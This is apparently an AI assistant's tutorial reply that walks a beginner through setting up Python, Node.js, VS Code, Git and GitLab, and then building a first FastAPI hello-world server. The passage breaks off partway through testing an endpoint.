Perfect. Let's start building your definitive tutorial. I'll give you Stage 0 right now - the foundation that everything else builds on.

---

# Stage 0: Absolute Beginner & Environment Setup

## Introduction: The Goal of This Stage

Before we can build a sophisticated web application, we need to prepare our workspace. Think of this like a carpenter setting up their workshop - you need the right tools, and you need to understand what each tool does and why you have it.

By the end of this stage, you will have:

- A working Python environment with package management
- A working JavaScript environment with Node.js
- A code editor configured for professional development
- Command-line skills to navigate and run programs
- Git installed and configured for version control
- A connection to GitLab for collaborative work

**Time Investment:** 2-4 hours (don't rush this - getting your environment right saves countless hours of frustration later)

---

## 0.1: Understanding Your Computer's Operating System

Before installing anything, you need to understand what operating system (OS) you're running. Your OS determines HOW you'll install tools and which commands you'll use.

### The Three Major Operating Systems

**1. Windows**

- Most common for personal computers
- Uses backslashes for file paths: `C:\Users\YourName\Documents`
- Package manager: `winget` (modern) or manual installers
- Terminal: PowerShell or Command Prompt

**2. macOS (Mac)**

- Based on Unix (like Linux)
- Uses forward slashes: `/Users/YourName/Documents`
- Package manager: Homebrew (we'll install this)
- Terminal: Terminal.app or iTerm2

**3. Linux**

- Many "distributions" (Ubuntu, Fedora, Arch, etc.)
- Uses forward slashes: `/home/yourname/documents`
- Package manager: depends on distribution (apt, dnf, pacman)
- Terminal: varies by distribution

### Check Your OS Version

**Windows:**

1. Press `Windows Key + R`
2. Type `winver` and press Enter
3. Note your version (Windows 10 or 11 recommended)

**macOS:**

1. Click Apple menu → "About This Mac"
2. Note your version (macOS 11+ recommended)

**Linux:**

```bash
cat /etc/os-release
```

**Why This Matters:** Different OS versions have different default paths, different ways to install software, and different commands. The tutorial will provide OS-specific instructions when needed.

---

## 0.2: Installing Python

### What is Python?

Python is a **programming language**. It's the language we'll use to write our backend server code. Think of it like learning Spanish or French - it's a way to communicate instructions to the computer.

**Why Python for our backend?**

- Readable syntax that resembles plain English
- Massive ecosystem of libraries for web development
- FastAPI (our chosen framework) is one of the fastest, most modern web frameworks available
- Used by companies like Instagram, Spotify, Netflix, and NASA

### The Python Interpreter

When you "install Python," you're installing an **interpreter** - a program that reads your Python code and executes it line by line.

**The Computer Science Behind It:**

- Your Python code is **source code** (human-readable text)
- The interpreter converts it into **bytecode** (a lower-level representation)
- The Python Virtual Machine (PVM) executes the bytecode
- This is different from compiled languages like C, where the entire program is converted to machine code before running

### Installation Steps

**Windows:**

1. Go to [python.org/downloads](https://www.python.org/downloads/)
2. Download Python 3.11 or 3.12 (NOT 3.13 yet - some libraries aren't compatible)
3. Run the installer
4. **CRITICAL:** Check "Add Python to PATH" before clicking Install
5. Verify installation:
   ```powershell
   python --version
   ```

**macOS:**

```bash
# First, install Homebrew (the Mac package manager)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Then install Python
brew install python@3.11

# Verify
python3 --version
```

**Linux (Ubuntu/Debian):**

```bash
sudo apt update
sudo apt install python3.11 python3.11-venv python3-pip
python3 --version
```

### Understanding `pip` - The Python Package Manager

When you installed Python, you also got `pip` (Pip Installs Packages). This is how you'll install third-party libraries.

**Verify pip installation:**

```bash
pip --version
# or on Mac/Linux:
pip3 --version
```

**The Analogy:** Think of `pip` like an app store for code. Instead of manually downloading libraries, you can type `pip install fastapi` and it automatically downloads FastAPI and all its dependencies.

---

## 0.3: Installing Node.js

### What is Node.js?

Node.js is **JavaScript running outside the browser**. Traditionally, JavaScript only ran in web browsers. Node.js is a runtime environment that allows JavaScript to run on servers, in terminals, and for build tools.

**Why do we need it?**

- We'll write frontend JavaScript that runs in the browser
- But we need Node.js for development tools (linters, build tools, package management)
- `npm` (Node Package Manager) comes with Node.js and manages JavaScript libraries

### Installation Steps

**All Operating Systems:**

1. Go to [nodejs.org](https://nodejs.org/)
2. Download the **LTS (Long Term Support)** version (currently 20.x or 22.x)
3. Run the installer (accept all defaults)
4. Verify installation:
   ```bash
   node --version
   npm --version
   ```

**What Just Happened?**
You now have two commands available:

- `node` - Runs JavaScript files: `node myfile.js`
- `npm` - Manages JavaScript packages: `npm install axios`

### Quick Test

Create a file `test.js`:

```javascript
console.log("Hello from Node.js!");
console.log("2 + 2 =", 2 + 2);
```

Run it:

```bash
node test.js
```

You should see:

```
Hello from Node.js!
2 + 2 = 4
```

**What's Happening:** Node.js read your file, executed the JavaScript, and printed the output to your terminal. This is the same JavaScript engine (V8) that powers Google Chrome.

---

## 0.4: Your Code Editor - Visual Studio Code

### Why Not Notepad or Word?

A **code editor** is designed specifically for writing code. It provides:

- **Syntax highlighting** - different colors for different parts of code
- **Auto-completion** - suggests code as you type
- **Error detection** - highlights mistakes before you run the code
- **Integrated terminal** - run commands without leaving the editor

### Installing VS Code

1. Go to [code.visualstudio.com](https://code.visualstudio.com/)
2. Download for your OS
3. Install (accept defaults)
4. Launch VS Code

### Essential Extensions

Click the Extensions icon (four squares) on the left sidebar and install:

1. **Python** (by Microsoft)
   - Provides Python IntelliSense, linting, debugging
2. **Pylance** (by Microsoft)
   - Advanced Python language support
3. **JavaScript (ES6) code snippets** (by charalampos karypidis)

   - Shortcuts for common JavaScript patterns

4. **GitLens** (by GitKraken)

   - Shows who changed what line of code and when

5. **Better Comments** (by Aaron Bond)
   - Makes comments more readable with color coding

### Configuring VS Code

Open Settings (Gear icon → Settings or `Ctrl+,`) and set:

- **Auto Save**: `onFocusChange` - automatically saves when you switch files
- **Format On Save**: Enabled - automatically formats code when saving
- **Tab Size**: 4 for Python, 2 for JavaScript (VS Code does this automatically)

### Creating Your Project Folder

1. Create a folder: `pdm-tutorial`
2. In VS Code: File → Open Folder → Select `pdm-tutorial`
3. This is your **workspace** - all tutorial files will go here

---

## 0.5: The Terminal/Command Line

### What is the Terminal?

The **terminal** (also called command line, shell, or console) is a text-based interface to your computer. Before graphical user interfaces (GUIs) with windows and icons, this was the ONLY way to use a computer.

**Why learn it?**

- Essential for running servers and development tools
- Faster than clicking through menus once you learn it
- Many professional tools are command-line only
- Required for working with Git, Docker, cloud services

### Opening Your Terminal

**Windows:**

- VS Code: View → Terminal (or `` Ctrl+` ``)
- Or: Start Menu → type "PowerShell"

**macOS:**

- VS Code: View → Terminal (or `` Ctrl+` ``)
- Or: Applications → Utilities → Terminal

**Linux:**

- Usually `Ctrl+Alt+T`

### Essential Commands

#### Navigation

**`pwd`** (Print Working Directory) - Where am I?

```bash
pwd
# Output: /Users/yourname/pdm-tutorial
```

**`ls`** (List) - What's in this folder? (Windows: `dir`)

```bash
ls
# Shows all files and folders in current directory
```

**`cd`** (Change Directory) - Move to a different folder

```bash
cd Documents           # Move into Documents folder
cd ..                  # Move up one level
cd ~                   # Move to home directory
cd /path/to/folder     # Move to specific path
```

#### File Operations

**`mkdir`** (Make Directory) - Create a folder

```bash
mkdir backend
mkdir frontend
```

**`touch`** - Create an empty file (Windows: `New-Item`)

```bash
touch main.py          # Creates main.py
# Windows:
New-Item main.py
```

**`cat`** - View file contents (Windows: `type`)

```bash
cat main.py
# Windows:
type main.py
```

**`rm`** - Remove file (CAREFUL - no undo!)

```bash
rm old_file.py
```

### The PATH Environment Variable

When you type `python` in the terminal, how does your computer know where to find the Python program?

**The Answer:** The `PATH` variable.

**Deep Dive:**

- `PATH` is a list of directories your OS searches when you type a command
- When you type `python`, the OS looks in each PATH directory for a file named `python` (or `python.exe` on Windows)
- The first match it finds is what gets executed

**View your PATH:**

```bash
# macOS/Linux:
echo $PATH

# Windows PowerShell:
$env:PATH
```

You'll see something like:

```
/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
```

These are directories separated by `:` (or `;` on Windows).

**Why "Add Python to PATH" was critical:**

- Without it, typing `python` would result in "command not found"
- You'd have to type the full path every time: `C:\Python311\python.exe`

---

## 0.6: Hello World in Python

Let's write your first Python program.

### Create the File

In your `pdm-tutorial` folder:

```bash
touch hello.py
```

Open `hello.py` in VS Code and type:

```python
# This is a comment - Python ignores it
# Comments explain what the code does

print("Hello, World!")
print("Welcome to PDM Development")

# Variables - boxes that store data
name = "Your Name"
print("My name is:", name)

# Simple math
x = 10
y = 20
print(f"{x} + {y} = {x + y}")
```

### Run It

In the terminal:

```bash
python hello.py
```

**Expected Output:**

```
Hello, World!
Welcome to PDM Development
My name is: Your Name
10 + 20 = 30
```

### Understanding What Happened

1. **The Python Interpreter** read your file line-by-line
2. **`print()`** is a built-in function that outputs text
3. **Variables** (`name`, `x`, `y`) store data in memory
4. **f-strings** (`f"..."`) let you insert variables into text
5. The program ran and exited

**The Computer Science:**

- Your source code is in a `.py` file (plain text)
- Python compiles it to bytecode (stored in `__pycache__` folder)
- The bytecode is executed by the Python Virtual Machine
- Output is sent to stdout (standard output - your terminal)

### Experiment

Try changing the code:

```python
# What happens with different data types?
age = 25                    # Integer (whole number)
price = 19.99              # Float (decimal)
is_student = True          # Boolean (True/False)
items = ["apple", "banana"] # List (collection)

print(f"Age: {age}, Type: {type(age)}")
print(f"Price: ${price}, Type: {type(price)}")
print(f"Student: {is_student}, Type: {type(is_student)}")
print(f"Items: {items}, Type: {type(items)}")
```

Run it and observe the output. You're learning Python's **type system**.

---

## 0.7: Hello World in JavaScript

### Create the File

```bash
touch hello.js
```

Open `hello.js`:

```javascript
// This is a comment in JavaScript
// JavaScript uses // for single-line comments

console.log("Hello, World!");
console.log("JavaScript running in Node.js");

// Variables in JavaScript
const name = "Your Name"; // const = constant (can't be changed)
let age = 25; // let = variable (can be changed)

console.log("Name:", name);
console.log("Age:", age);

// Simple math
let x = 10;
let y = 20;
console.log(`${x} + ${y} = ${x + y}`); // Template literals use backticks

// Arrays (lists)
const colors = ["red", "green", "blue"];
console.log("Colors:", colors);

// Objects (like Python dictionaries)
const person = {
  firstName: "John",
  lastName: "Doe",
  age: 30,
};
console.log("Person:", person);
```

### Run It

```bash
node hello.js
```

### Python vs JavaScript - Key Differences

| Aspect               | Python                        | JavaScript                                     |
| -------------------- | ----------------------------- | ---------------------------------------------- |
| Comments             | `#`                           | `//` or `/* */`                                |
| Variables            | `name = "value"`              | `const name = "value"` or `let name = "value"` |
| String formatting    | `f"{var}"`                    | `` `${var}` ``                                 |
| Print output         | `print()`                     | `console.log()`                                |
| Lists/Arrays         | `[1, 2, 3]`                   | `[1, 2, 3]` (same syntax!)                     |
| Dictionaries/Objects | `{"key": "value"}`            | `{key: "value"}` (no quotes on keys)           |
| Indentation          | **Required** (defines blocks) | Optional (uses `{}` for blocks)                |

---

## 0.8: Virtual Environments - The Deep Dive

### The Problem

Imagine you're working on three Python projects:

- **Project A** needs Django version 3.2
- **Project B** needs Django version 4.0
- **Project C** doesn't use Django at all

If you install Django globally (for your entire system), you can only have ONE version. Projects will break.

### The Solution: Virtual Environments

A **virtual environment** (venv) is an isolated Python installation for ONE project.

**The Analogy:** Think of your system Python as a shared kitchen. Everyone uses it, and if someone makes a mess, it affects everyone. A virtual environment is giving each project its own private kitchen.

### How It Works (Under the Hood)

When you create a venv:

1. Python creates a folder (usually named `venv`) in your project
2. Inside, it creates a copy of the Python interpreter
3. It creates a `site-packages` folder for this project's libraries
4. It modifies your `PATH` when activated to prioritize this Python

### Creating a Virtual Environment

In your `pdm-tutorial` folder:

```bash
# Create the venv
python -m venv venv

# Activate it
# Windows PowerShell:
venv\Scripts\Activate.ps1

# macOS/Linux:
source venv/bin/activate
```

**You'll see `(venv)` appear in your terminal prompt.**

This means: "You are now using the isolated Python environment for this project."

### The sys.path Exercise

Let's SEE what the venv does.

**BEFORE activating venv:**

```bash
# Make sure venv is NOT activated
python -c "import sys; print('\n'.join(sys.path))"
```

You'll see system-wide Python directories.

**AFTER activating venv:**

```bash
# Now activate
source venv/bin/activate  # or venv\Scripts\Activate.ps1 on Windows

python -c "import sys; print('\n'.join(sys.path))"
```

**Notice the difference:** The FIRST path is now `.../pdm-tutorial/venv/lib/python3.11/site-packages`

**What This Means:**

- When you `import fastapi`, Python searches directories in order
- With venv activated, it finds your project's isolated copy FIRST
- System libraries are still accessible as a fallback

### Installing Packages in the venv

```bash
# Make sure venv is activated (you see (venv) in prompt)
pip install requests

# Check what's installed
pip list
```

You'll see a SHORT list - just what YOU installed.

**Deactivate the venv:**

```bash
deactivate
```

**Check again:**

```bash
pip list
```

You'll see your SYSTEM-WIDE packages - a much longer list.

**The Power:** Each project has its own dependencies. No conflicts, ever.

### The Dependency Graph

Let's visualize the tree of dependencies.

```bash
# Activate venv
source venv/bin/activate

# Install the visualization tool
pip install pipdeptree

# Run it
pipdeptree
```

**Output example:**

```
requests==2.31.0
├── certifi [required: >=2017.4.17, installed: 2023.7.22]
├── charset-normalizer [required: >=2.0.0,<4, installed: 3.2.0]
├── idna [required: >=2.5,<4, installed: 3.4]
└── urllib3 [required: >=1.21.1,<3, installed: 2.0.4]
```

**What This Shows:**

- You installed ONE package (`requests`)
- But it DEPENDS on four other packages
- `pip` automatically installed all of them
- This tree can get VERY deep for complex frameworks

**The Lesson:** Modern software is built on layers of dependencies. Understanding this graph is crucial for debugging version conflicts.

---

## 0.9: Version Control with Git

### What is Version Control?

**The Problem Without It:**

- You make changes to your code
- Something breaks
- You can't remember what you changed
- You have no "undo" button
- You're working with a teammate - how do you merge your changes?

**The Solution:**
Git is a **Distributed Version Control System (DVCS)**. It:

- Tracks every change to your files
- Lets you "rewind" to any previous state
- Enables multiple people to work on the same code
- Shows you exactly who changed what and why

### Installing Git

**Windows:**

- Download from [git-scm.com](https://git-scm.com/)
- Run installer (accept defaults)

**macOS:**

```bash
brew install git
```

**Linux:**

```bash
sudo apt install git  # Ubuntu/Debian
```

**Verify:**

```bash
git --version
```

### Configuring Git (IMPORTANT - Do This Once)

```bash
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"
```

**Why This Matters:** Every Git commit records who made it. This information is stored forever in the project's history.

### Your First Repository

A **repository** (repo) is a project tracked by Git.

```bash
# In your pdm-tutorial folder
git init
```

**What happened?**

```bash
ls -la  # macOS/Linux
dir /a  # Windows
```

You'll see a hidden `.git` folder. This IS the repository - it contains the entire history of your project.

**Warning:** NEVER delete the `.git` folder unless you want to lose all history.

### The Three-Stage Architecture

Git has three conceptual "areas":

1. **Working Directory** - Your actual files (the messy workbench)
2. **Staging Area (Index)** - Changes ready to be saved (the clean photo table)
3. **Repository (.git folder)** - Permanent saved snapshots (the photo album)

### Making Your First Commit

**Step 1: Create a file to track**

```bash
echo "# PDM Tutorial" > README.md
```

**Step 2: Check status**

```bash
git status
```

Output:

```
Untracked files:
  README.md
```

Git sees the file but isn't tracking it yet.

**Step 3: Stage the file**

```bash
git add README.md
```

**Check status again:**

```bash
git status
```

Output:

```
Changes to be committed:
  new file: README.md
```

The file is now in the staging area.

**Step 4: Commit (save the snapshot)**

```bash
git commit -m "Initial commit: Add README"
```

The `-m` flag adds a message explaining WHAT you changed and WHY.

### Viewing History

```bash
git log
```

You'll see:

```
commit a3f5c9b... (HEAD -> main)
Author: Your Name <your.email@example.com>
Date:   Fri Oct 03 2025

    Initial commit: Add README
```

**What's a commit hash?** That `a3f5c9b...` is a SHA-1 hash (40 characters). It's a unique identifier for this snapshot. You can use it to reference this exact version of the code forever.

### Essential Git Commands Summary

```bash
git init                    # Create a new repository
git status                  # See what's changed
git add <file>              # Stage a file
git add .                   # Stage all changed files
git commit -m "message"     # Save a snapshot
git log                     # View history
git diff                    # See unstaged changes
git diff --staged           # See staged changes
```

---

## 0.10: Connecting to GitLab

### What is GitLab?

**Git** is the tool on your computer.  
**GitLab** is a website/server that hosts Git repositories.

**The Analogy:**

- Git = A diary you keep on your desk
- GitLab = A secure vault where you store a copy of your diary

**Why Use GitLab?**

- **Backup** - Your code is safe even if your computer dies
- **Collaboration** - Multiple people can work on the same project
- **Deployment** - Many hosting services (like Heroku) deploy directly from GitLab
- **CI/CD** - Automatically test and deploy your code

**Alternatives:** GitHub, Bitbucket (all use Git, just different hosting companies)

### Creating a GitLab Account

1. Go to [gitlab.com](https://gitlab.com)
2. Sign up (free tier is generous)
3. Verify your email
4. You're ready

### SSH Keys - Secure Authentication

When you push code to GitLab, it needs to verify you're YOU. You could type your password every time, but there's a better way: **SSH keys**.

**How SSH Keys Work:**

1. You generate two files: a **private key** (stays on your computer) and a **public key** (goes to GitLab)
2. GitLab uses the public key to create a challenge
3. Your private key proves you can solve the challenge
4. This is **cryptographically secure** and more convenient than passwords

### Generating SSH Keys

```bash
# Check if you already have keys
ls -la ~/.ssh

# If you don't see id_rsa and id_rsa.pub, generate them:
ssh-keygen -t rsa -b 4096 -C "your.email@example.com"

# Press Enter for all prompts (accept defaults)
```

**What You Created:**

- `~/.ssh/id_rsa` - Your **private key** (NEVER share this)
- `~/.ssh/id_rsa.pub` - Your **public key** (safe to share)

### Adding Your Public Key to GitLab

1. Display your public key:

```bash
cat ~/.ssh/id_rsa.pub
```

2. Copy the entire output (starts with `ssh-rsa`)

3. In GitLab:
   - Click your avatar → Settings
   - SSH Keys (left sidebar)
   - Paste the key
   - Give it a title (like "My Laptop")
   - Click "Add key"

### Test the Connection

```bash
ssh -T git@gitlab.com
```

If successful:

```
Welcome to GitLab, @yourusername!
```

### Creating a Repository on GitLab

1. In GitLab, click "New project"
2. Choose "Create blank project"
3. Name: `pdm-tutorial`
4. Visibility: Private (for now)
5. **UNCHECK** "Initialize repository with a README" (we already have one locally)
6. Click "Create project"

### Connecting Your Local Repo to GitLab

GitLab will show you a command like this:

```bash
git remote add origin git@gitlab.com:yourusername/pdm-tutorial.git
```

This tells Git: "The remote server (called 'origin') is at this URL."

### Pushing Your Code

```bash
# Push your main branch to GitLab
git push -u origin main
```

The `-u` flag sets up tracking. Future pushes can just be `git push`.

**Refresh GitLab in your browser** - you'll see your README.md file!

### The Workflow (This is What You'll Do Daily)

```bash
# 1. Make changes to files
echo "New content" >> README.md

# 2. Stage changes
git add README.md

# 3. Commit
git commit -m "Update README with new content"

# 4. Push to GitLab
git push
```

That's it. You've backed up your work and made it available to collaborators.

---

## Stage 0 Complete - Verification Checklist

Before moving to Stage 1, verify you have:

- [ ] Python 3.11+ installed (`python --version`)
- [ ] pip working (`pip --version`)
- [ ] Node.js installed (`node --version`)
- [ ] npm working (`npm --version`)
- [ ] VS Code installed with Python extension
- [ ] Terminal basics mastered (cd, ls, mkdir)
- [ ] Virtual environment created and activated
- [ ] Git installed and configured
- [ ] GitLab account created
- [ ] SSH key added to GitLab
- [ ] Test repository pushed to GitLab

### Troubleshooting Common Issues

**"python: command not found"**

- Python isn't in your PATH
- Try `python3` instead (macOS/Linux)
- Reinstall Python with "Add to PATH" checked

**"Permission denied (SSH)"**

- SSH key not added to GitLab correctly
- Run `ssh -T git@gitlab.com` to test

**"pip install" is slow**

- Normal on first install (downloads packages)
- Future installs will be cached

---

## What's Next?

Stage 0 was about preparation. You now have:

- A proper development environment
- Version control for tracking changes
- The foundational tools every developer uses

**In Stage 1**, we'll write our first FastAPI application. We'll start with a single endpoint that returns "Hello World" and understand every line of code that makes it work.

Take a break, experiment with the commands you've learned, and when you're ready, we'll start building the PDM application.

---

**Copy this entire section into your MkDocs. When you're ready, I'll give you Stage 1.**

# Stage 1: First Backend - FastAPI Hello World

## Introduction: The Goal of This Stage

You're about to write your first web server. By the end of this stage, you will:

- Understand what a web server actually IS
- Create a FastAPI application from absolute scratch
- Learn async/await in Python (the key to FastAPI's speed)
- Serve JSON data through API endpoints
- Implement basic error handling and logging
- Write your first automated tests

**Time Investment:** 3-5 hours

---

## 1.1: What is a Web Server? The Restaurant Analogy

### The Client-Server Model

Before writing any code, you need to understand the fundamental architecture of the web.

**The Two Roles:**

1. **Client** - Makes requests (your web browser, mobile app)
2. **Server** - Fulfills requests (your FastAPI application)

**The Restaurant Analogy:**

| Restaurant | Web Application            |
| ---------- | -------------------------- |
| Customer   | Client (browser)           |
| Waiter     | HTTP Protocol              |
| Menu       | Available endpoints (URLs) |
| Kitchen    | Your FastAPI code          |
| Food       | JSON data response         |

**The Flow:**

1. Customer looks at menu and orders "burger"
2. Waiter writes down order and brings it to kitchen
3. Kitchen prepares burger
4. Waiter delivers burger to customer
5. Customer enjoys burger

**Translated to Web:**

1. Browser looks at your site and requests `GET /api/files`
2. HTTP protocol carries the request to your server
3. FastAPI code processes the request
4. FastAPI returns JSON data
5. Browser displays the data

### HTTP: The Language of the Web

**HTTP (HyperText Transfer Protocol)** is how clients and servers communicate. It's a text-based protocol - you can literally read it.

**An HTTP Request looks like this:**

```
GET /api/files HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0
Accept: application/json
```

**An HTTP Response looks like this:**

```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 47

{"files": ["file1.mcam", "file2.mcam"]}
```

We'll see this in action shortly.

### Why FastAPI?

**The Python Web Framework Landscape:**

- **Django** - The "batteries included" framework. Opinionated, comes with everything (ORM, admin panel, auth). Great for traditional web apps. Slower than FastAPI.
- **Flask** - Minimal, flexible. You add what you need. Synchronous (not async). Been around since 2010.
- **FastAPI** - Modern, fast, built on async. Automatic API documentation. Type hints for validation. Released 2018.

**We chose FastAPI because:**

- **Performance** - One of the fastest Python frameworks (comparable to Node.js)
- **Modern Python** - Uses type hints, async/await (Python 3.6+ features)
- **Auto Documentation** - Generates interactive API docs automatically
- **Data Validation** - Pydantic integration catches errors before they happen
- **Production Ready** - Used by Microsoft, Uber, Netflix

---

## 1.2: Installing FastAPI and Understanding Dependencies

### Activate Your Virtual Environment

**ALWAYS do this first when working on this project:**

```bash
# In your pdm-tutorial folder
source venv/bin/activate  # macOS/Linux
# or
venv\Scripts\Activate.ps1  # Windows
```

You should see `(venv)` in your terminal prompt.

### Installing FastAPI

```bash
pip install "fastapi[all]"
```

**What just happened?**

The `[all]` extra installs additional dependencies. Let's see what we got:

```bash
pip list | grep -i fastapi  # macOS/Linux
pip list | findstr fastapi  # Windows
```

You'll see:

- `fastapi` - The framework itself
- `uvicorn` - The ASGI server (runs your app)
- `starlette` - FastAPI is built on top of this
- `pydantic` - Data validation
- And more...

### Understanding the Dependency Tree

```bash
pip install pipdeptree
pipdeptree -p fastapi
```

**Output (simplified):**

```
fastapi==0.104.1
├── pydantic [required: >=1.7.4, installed: 2.4.2]
│   ├── annotated-types [required: >=0.4.0]
│   ├── pydantic-core [required: ==2.10.1]
│   └── typing-extensions [required: >=4.6.1]
├── starlette [required: <0.28.0, installed: 0.27.0]
│   └── anyio [required: >=3.4.0, <5]
└── typing-extensions [required: >=4.5.0]
```

**What This Shows:**

- FastAPI depends on 3 direct packages
- Those packages have their own dependencies
- Total: ~15-20 packages installed
- `pip` resolved all version constraints automatically

**The Lesson:** Modern software is built on layers of abstractions. You're not reinventing HTTP - you're using battle-tested libraries.

---

## 1.3: Your First FastAPI Application

### Create the File Structure

```bash
# Make sure you're in pdm-tutorial folder
mkdir backend
cd backend
touch main.py
```

### The Simplest Possible Server

Open `backend/main.py` and type this:

```python
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"message": "Hello World"}
```

That's it. This is a complete web server.

### Understanding Every Line

**Line 1: `from fastapi import FastAPI`**

- `from` - We're importing FROM a package
- `fastapi` - The package we installed
- `import FastAPI` - We want the `FastAPI` class specifically
- **Why not `import fastapi`?** We could, but then we'd write `fastapi.FastAPI()`. This is cleaner.

**Line 3: `app = FastAPI()`**

- `app` - A variable name (you could call it anything, but `app` is convention)
- `FastAPI()` - Creates an instance of the FastAPI class
- **What's an instance?** The class is the blueprint; the instance is the actual building. `FastAPI` is the concept of a web framework; `app` is YOUR specific application.

**Line 5: `@app.get("/")`**

- `@` - This is a **decorator** (we'll explain shortly)
- `app.get` - Registers a GET endpoint
- `"/"` - The URL path (root of the website)
- **Translation:** "When someone makes a GET request to `/`, run the function below"

**Line 6: `def read_root():`**

- A normal Python function
- The name doesn't matter to FastAPI (use descriptive names)
- **No parameters** - This simple endpoint doesn't need any

**Line 7: `return {"message": "Hello World"}`**

- Returns a Python dictionary
- FastAPI **automatically converts** this to JSON
- You NEVER manually convert to JSON (FastAPI does it)

### Python Decorators - A Deep Dive

**The Concept:** A decorator is a function that modifies another function.

**Without Decorators (the manual way):**

```python
def read_root():
    return {"message": "Hello World"}

# Manually register the route
app.add_route("/", read_root, methods=["GET"])
```

**With Decorators (the clean way):**

```python
@app.get("/")
def read_root():
    return {"message": "Hello World"}
```

**What's Happening Behind the Scenes:**

1. Python sees the `@app.get("/")` decorator
2. It calls `app.get("/")` which returns a decorator function
3. That decorator function wraps your `read_root` function
4. Now `read_root` is registered as the handler for `GET /`

**The Analogy:** Think of a decorator like gift wrapping. The present (your function) is the same, but the wrapper (the decorator) adds extra functionality (routing, logging, authentication, etc.).

**Playground Exercise - Understanding Decorators:**

Create `test_decorators.py`:

```python
# A simple decorator that prints before and after
def logger(func):
    def wrapper(*args, **kwargs):
        print(f"BEFORE calling {func.__name__}")
        result = func(*args, **kwargs)
        print(f"AFTER calling {func.__name__}")
        return result
    return wrapper

# Using the decorator
@logger
def greet(name):
    print(f"Hello, {name}!")
    return f"Greeted {name}"

# Call it
result = greet("Alice")
print(f"Result: {result}")
```

Run it:

```bash
python test_decorators.py
```

**Output:**

```
BEFORE calling greet
Hello, Alice!
AFTER calling greet
Result: Greeted Alice
```

**The Power:** The `greet` function doesn't know it's being logged. The decorator added functionality WITHOUT changing the original function. This is the "separation of concerns" principle.

---

## 1.4: Running the Server with Uvicorn

### What is Uvicorn?

**Uvicorn** is an **ASGI server**. Let's break that down:

- **ASGI** = Asynchronous Server Gateway Interface
- **Server** = A program that listens for HTTP requests
- **Gateway** = Connects the HTTP world to your Python code
- **Interface** = A standard way for servers to talk to frameworks

**The Analogy:** FastAPI is the restaurant kitchen. Uvicorn is the building that houses it - the utilities, the doors, the infrastructure.

### Starting the Server

In your terminal (with venv activated):

```bash
cd backend  # If not already there
uvicorn main:app --reload
```

**Breaking Down the Command:**

- `uvicorn` - The server program
- `main` - The Python file (main.py)
- `app` - The variable name inside main.py
- `--reload` - Automatically restart when code changes (DEVELOPMENT ONLY)

**Expected Output:**

```
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
INFO:     Started reloader process
INFO:     Started server process
INFO:     Waiting for application startup.
INFO:     Application startup complete.
```

**Your server is running!**

### Understanding the Address

`http://127.0.0.1:8000`

- **`http://`** - The protocol
- **`127.0.0.1`** - The IP address (localhost - your computer)
- **`8000`** - The port number

**What's a Port?**

Your computer has ONE IP address but can run MANY servers. Ports are like apartment numbers:

- Building address: `127.0.0.1`
- Apartment 8000: Your FastAPI app
- Apartment 3000: Maybe a React app
- Apartment 5432: Maybe a PostgreSQL database

**Why 8000?** Just convention. You could use any port above 1024 that's not already in use.

### Testing Your Server

**Method 1: Browser**

- Open `http://127.0.0.1:8000` in your browser
- You should see: `{"message":"Hello World"}`

**Method 2: curl (Command Line)**

Open a **NEW terminal window** (keep the server running in the first):

```bash
curl http://127.0.0.1:8000
```

**Output:**

```json
{ "message": "Hello World" }
```

**Method 3: Python Requests**

Create `test_client.py`:

```python
import requests

response = requests.get("http://127.0.0.1:8000")
print(f"Status Code: {response.status_code}")
print(f"Content: {response.json()}")
```

Run it:

```bash
pip install requests
python test_client.py
```

**Output:**

```
Status Code: 200
Content: {'message': 'Hello World'}
```

---

## 1.5: The Raw HTTP - Using curl Verbose Mode

Let's see the ACTUAL HTTP traffic.

```bash
curl -v http://127.0.0.1:8000
```

**Output (annotated):**

```
* Trying 127.0.0.1:8000...           # Connecting to server
* Connected to 127.0.0.1             # Connection established

> GET / HTTP/1.1                     # REQUEST LINE
> Host: 127.0.0.1:8000              # REQUEST HEADERS
> User-Agent: curl/7.79.1
> Accept: */*
>                                    # Blank line = end of headers

< HTTP/1.1 200 OK                    # RESPONSE STATUS LINE
< date: Fri, 03 Oct 2025 20:30:00 GMT   # RESPONSE HEADERS
< server: uvicorn
< content-length: 25
< content-type: application/json
<                                    # Blank line = end of headers

{"message":"Hello World"}            # RESPONSE BODY
```

**Lines starting with `>` = What you sent**  
**Lines starting with `<` = What the server sent back**

**This is the actual text** being transmitted over the network. HTTP is human-readable!

### HTTP Status Codes

The `200` in `HTTP/1.1 200 OK` is a status code. Essential ones:

| Code | Meaning      | Example                       |
| ---- | ------------ | ----------------------------- |
| 200  | OK           | Request succeeded             |
| 201  | Created      | New resource created (POST)   |
| 400  | Bad Request  | Client sent invalid data      |
| 401  | Unauthorized | Authentication required       |
| 403  | Forbidden    | Authenticated but not allowed |
| 404  | Not Found    | Resource doesn't exist        |
| 500  | Server Error | Something broke on server     |

**Try getting a 404:**

```bash
curl -v http://127.0.0.1:8000/nonexistent
```

You'll see:

```
< HTTP/1.1 404 Not Found
```

FastAPI automatically returns 404 for undefined routes.

---

## 1.6: Adding More Endpoints

### The Four HTTP Methods (CRUD)

| HTTP Method | Purpose        | SQL Equivalent | Example              |
| ----------- | -------------- | -------------- | -------------------- |
| GET         | Read data      | SELECT         | Get list of files    |
| POST        | Create data    | INSERT         | Upload a new file    |
| PUT         | Update/Replace | UPDATE         | Replace file content |
| DELETE      | Delete data    | DELETE         | Remove a file        |

### Adding a New Endpoint

Update `main.py`:

```python
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def read_root():
    return {"message": "Hello from the PDM Backend!"}

@app.get("/api/files")
def get_files():
    # Hardcoded for now - we'll make this real later
    files = [
        {"name": "PN1001_OP1.mcam", "status": "available"},
        {"name": "PN1002_OP1.mcam", "status": "checked_out"},
        {"name": "PN1003_OP1.mcam", "status": "available"}
    ]
    return {"files": files}
```

**Save the file.** With `--reload`, Uvicorn automatically restarts.

Check the terminal:

```
INFO:     Application startup complete.
```

### Test the New Endpoint

```bash
curl http://127.0.0.1:8000/api/files
```

**Output (pretty-printed):**

```json
{
  "files": [
    { "name": "PN1001_OP1.mcam", "status": "available" },
